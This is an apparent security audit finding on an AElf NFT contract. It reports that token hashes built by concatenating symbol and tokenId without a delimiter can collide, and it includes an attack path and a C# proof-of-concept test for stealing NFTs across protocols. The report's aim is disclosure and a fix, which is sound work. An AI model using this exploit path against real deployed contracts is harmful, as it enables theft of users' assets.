# Audit Report

## Title
TokenHash Collision Vulnerability Enables Cross-Protocol State Corruption and Allowance Theft

## Summary
The NFT contract's `CalculateTokenHash()` function concatenates symbol and tokenId without a delimiter, creating hash collisions between different NFT protocols. This allows attackers to manipulate allowances and balances across unrelated protocols, enabling theft of NFT assets through standard approval mechanisms.

## Finding Description

The vulnerability stems from the token hash calculation that concatenates symbol and tokenId as strings without any separator: [1](#0-0) 

NFT protocol symbols are generated with a 2-letter prefix followed by random numbers with a minimum length of 9 digits: [2](#0-1) 

The symbol number length dynamically increases as more protocols are created: [3](#0-2) 

This creates collision scenarios where:
- Protocol A: symbol "AR123456789" (9 digits) with tokenId=123 → hash("AR123456789123")  
- Protocol B: symbol "AR1234567891" (10 digits) with tokenId=23 → hash("AR123456789123")

Both produce identical hashes. All critical state mappings are keyed by this tokenHash: [4](#0-3) 

The `Approve()` function sets allowances using the calculated tokenHash without validating the symbol corresponds to an actual NFT: [5](#0-4) 

The `TransferFrom()` function checks allowances and transfers balances using the same tokenHash, also without symbol validation: [6](#0-5) 

**Attack Path:**
1. Alice owns NFT from Protocol A (AR123456789, tokenId=123)
2. Protocol B is created later with symbol AR1234567891 (natural progression as protocol count grows)
3. Attacker tricks Alice into approving (AR1234567891, tokenId=23) for the attacker
4. Due to hash collision, this sets allowance at the SAME tokenHash as Alice's Protocol A NFT
5. Attacker calls `TransferFrom` for either (AR123456789, 123) or (AR1234567891, 23)
6. Both reference the same tokenHash, same allowance, same balance mapping
7. Attacker steals Alice's Protocol A NFT using approval Alice gave for Protocol B

## Impact Explanation

**Critical Severity** - This vulnerability enables:

1. **Cross-Protocol Allowance Theft**: Attackers can spend allowances granted for one NFT protocol to steal NFTs from a completely different protocol. The shared allowance state means approval on Protocol B grants transfer rights on Protocol A.

2. **Balance Manipulation**: Since both colliding NFTs share the same balance mapping, transfers on one NFT directly affect the other's balance, allowing attackers to artificially inflate balances or drain victim accounts.

3. **NFT Metadata Corruption**: Minting or updating colliding NFTs can overwrite or corrupt metadata belonging to existing NFTs from different protocols.

The vulnerability breaks the fundamental security guarantee that NFT protocols are isolated from each other, allowing cross-contamination of critical state.

## Likelihood Explanation

**High Likelihood** due to:

1. **Natural Collision Occurrence**: As the protocol count grows and symbol length increases from 9 to 10 digits, every existing 9-digit protocol creates 10 potential collision opportunities with new 10-digit protocols. With thousands of protocols, collisions become statistically inevitable.

2. **Low Attack Requirements**: Attacker only needs standard minting privileges (available to authorized minters) and ability to specify tokenIds during minting (standard feature confirmed in PerformMint): [7](#0-6) 

3. **Difficult Detection**: Collisions appear as legitimate state updates within protocol rules. No event or validation flags the hash collision.

4. **Social Engineering Viability**: Users routinely approve NFT protocols for marketplace interactions, making it realistic to obtain approvals on the "wrong" protocol that actually grants access to valuable NFTs on the colliding protocol.

## Recommendation

Add a delimiter or use a structured hashing approach that prevents ambiguity:

```csharp
private Hash CalculateTokenHash(string symbol, long tokenId)
{
    // Option 1: Use delimiter
    return HashHelper.ComputeFrom($"{symbol}|{tokenId}");
    
    // Option 2: Hash components separately (preferred)
    var symbolHash = HashHelper.ComputeFrom(symbol);
    var tokenIdHash = HashHelper.ComputeFrom(tokenId);
    return HashHelper.ConcatAndCompute(symbolHash, tokenIdHash);
}
```

Additionally, add validation in critical functions to verify the tokenHash belongs to the claimed symbol:

```csharp
public override Empty Approve(ApproveInput input)
{
    var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
    var nftInfo = State.NftInfoMap[tokenHash];
    Assert(nftInfo != null && nftInfo.Symbol == input.Symbol, 
        "Token hash does not match claimed symbol");
    
    State.AllowanceMap[tokenHash][Context.Sender][input.Spender] = input.Amount;
    // ... rest of function
}
```

## Proof of Concept

```csharp
[Fact]
public async Task TokenHashCollisionAllowsTheft()
{
    // Setup: Create Protocol A with 9-digit symbol
    var symbolA = "AR123456789"; // Simulated 9-digit protocol
    await CreateProtocol(symbolA);
    
    // Alice mints NFT from Protocol A with tokenId=123
    var tokenHashA = await MintNFT(symbolA, tokenId: 123, owner: Alice);
    
    // Protocol B created later with 10-digit symbol (natural progression)
    var symbolB = "AR1234567891"; // 10-digit protocol
    await CreateProtocol(symbolB);
    
    // Verify collision: both produce same hash
    var tokenHashB = CalculateTokenHash(symbolB, tokenId: 23);
    tokenHashA.ShouldBe(tokenHashB); // COLLISION!
    
    // Alice approves Attacker for "Protocol B" NFT
    await Alice_Approve(symbol: symbolB, tokenId: 23, spender: Attacker, amount: 1);
    
    // Attacker steals Alice's Protocol A NFT using Protocol B approval
    await Attacker_TransferFrom(
        symbol: symbolA, 
        tokenId: 123, 
        from: Alice, 
        to: Attacker, 
        amount: 1
    );
    
    // Verify theft succeeded
    var attackerBalance = await GetBalance(tokenHashA, Attacker);
    attackerBalance.ShouldBe(1); // Attacker stole Alice's NFT
    
    var aliceBalance = await GetBalance(tokenHashA, Alice);
    aliceBalance.ShouldBe(0); // Alice lost her NFT
}
```

**Notes:**
- The vulnerability is inherent in the design where string concatenation without delimiters creates ambiguous inputs
- Symbol uniqueness checks only validate random numbers, not final tokenHash uniqueness across all protocols
- The issue affects all state keyed by tokenHash: balances, allowances, and NFT metadata
- Mitigation requires both fixing the hash calculation and adding validation in transfer/approval functions

### Citations

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L57-79)
```csharp
    public override Empty TransferFrom(TransferFromInput input)
    {
        var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
        var operatorList = State.OperatorMap[input.Symbol][input.From];
        var isOperator = operatorList?.Value.Contains(Context.Sender) ?? false;
        if (!isOperator)
        {
            var allowance = State.AllowanceMap[tokenHash][input.From][Context.Sender];
            Assert(allowance >= input.Amount, "Not approved.");
            State.AllowanceMap[tokenHash][input.From][Context.Sender] = allowance.Sub(input.Amount);
        }

        DoTransfer(tokenHash, input.From, input.To, input.Amount);
        Context.Fire(new Transferred
        {
            From = input.From,
            To = input.To,
            Amount = input.Amount,
            Symbol = input.Symbol,
            TokenId = input.TokenId,
            Memo = input.Memo
        });
        return new Empty();
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L295-308)
```csharp
    public override Empty Approve(ApproveInput input)
    {
        var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
        State.AllowanceMap[tokenHash][Context.Sender][input.Spender] = input.Amount;
        Context.Fire(new Approved
        {
            Owner = Context.Sender,
            Spender = input.Spender,
            Symbol = input.Symbol,
            Amount = input.Amount,
            TokenId = input.TokenId
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L330-332)
```csharp
    private Hash CalculateTokenHash(string symbol, long tokenId)
    {
        return HashHelper.ComputeFrom($"{symbol}{tokenId}");
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L383-396)
```csharp
    private NFTMinted PerformMint(MintInput input, bool isTokenIdMustBeUnique = false)
    {
        var tokenInfo = State.TokenContract.GetTokenInfo.Call(new GetTokenInfoInput
        {
            Symbol = input.Symbol
        });
        var protocolInfo = State.NftProtocolMap[input.Symbol];
        if (protocolInfo == null) throw new AssertionException($"Invalid NFT Token symbol: {input.Symbol}");

        var tokenId = input.TokenId == 0 ? protocolInfo.Issued.Add(1) : input.TokenId;
        var tokenHash = CalculateTokenHash(input.Symbol, tokenId);
        var nftInfo = State.NftInfoMap[tokenHash];
        if (!protocolInfo.IsTokenIdReuse || isTokenIdMustBeUnique)
            Assert(nftInfo == null, $"Token id {tokenId} already exists. Please assign a different token id.");
```

**File:** contract/AElf.Contracts.NFT/NFTContractConstants.cs (L5-5)
```csharp
    private const int NumberMinLength = 9;
```

**File:** contract/AElf.Contracts.NFT/NFTContract_Helpers.cs (L87-116)
```csharp
    private int GetCurrentNumberLength()
    {
        if (State.CurrentSymbolNumberLength.Value == 0) State.CurrentSymbolNumberLength.Value = NumberMinLength;

        var flag = State.NftProtocolNumberFlag.Value;

        if (flag == 0)
        {
            // Initial protocol number flag.
            var protocolNumber = 1;
            for (var i = 1; i < State.CurrentSymbolNumberLength.Value; i++) protocolNumber = protocolNumber.Mul(10);

            State.NftProtocolNumberFlag.Value = protocolNumber;
            flag = protocolNumber;
        }

        var upperNumberFlag = flag.Mul(2);
        if (upperNumberFlag.ToString().Length > State.CurrentSymbolNumberLength.Value)
        {
            var newSymbolNumberLength = State.CurrentSymbolNumberLength.Value.Add(1);
            State.CurrentSymbolNumberLength.Value = newSymbolNumberLength;
            var protocolNumber = 1;
            for (var i = 1; i < newSymbolNumberLength; i++) protocolNumber = protocolNumber.Mul(10);

            State.NftProtocolNumberFlag.Value = protocolNumber;
            return newSymbolNumberLength;
        }

        return State.CurrentSymbolNumberLength.Value;
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContractState.cs (L17-30)
```csharp
    public MappedState<Hash, NFTInfo> NftInfoMap { get; set; }

    /// <summary>
    ///     Token Hash -> Owner Address -> Balance
    /// </summary>
    public MappedState<Hash, Address, long> BalanceMap { get; set; }

    public MappedState<string, NFTProtocolInfo> NftProtocolMap { get; set; }

    /// <summary>
    ///     Token Hash -> Owner Address -> Spender Address -> Approved Amount
    ///     Need to record approved by whom.
    /// </summary>
    public MappedState<Hash, Address, Address, long> AllowanceMap { get; set; }
```
